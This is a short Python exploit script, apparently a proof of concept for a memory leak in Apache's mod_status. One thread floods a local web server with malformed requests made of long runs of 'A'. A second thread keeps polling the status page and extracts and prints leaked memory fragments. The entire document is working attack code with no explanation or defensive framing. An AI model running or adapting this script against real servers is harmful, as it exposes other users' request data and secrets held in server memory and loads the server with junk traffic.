#!/usr/bin/env python
import http.client 
import sys
import threading
import subprocess
import random
import re

def send_request(method, url):
    try:
        c = http.client.HTTPConnection('127.0.0.1', 80)
        c.request(method,url)
        if "foo" in url:
            #find_leaks(c.getresponse().read())
            string = c.getresponse().read().decode('ISO-8859-1')
            matches = re.findall(re.compile('\{(.*)\}'),string)
            leaks = []
            for match in matches:
                if not match or 'AAAA' in match or 'notables' in match:
                    continue
                else:
                    leaks.append(match)
            if(len(leaks)>0):
                print(leaks)

        c.close()
    except Exception as e:
        print(e)
        pass

def mod_status_thread():
    while True:
        send_request("GET", "/foo?notables")

def requests():
    req = ''.join('A' for i in range(random.randint(0, 1024)))
    while True:
        send_request(req, req)

threading.Thread(target=mod_status_thread).start()
threading.Thread(target=requests).start()
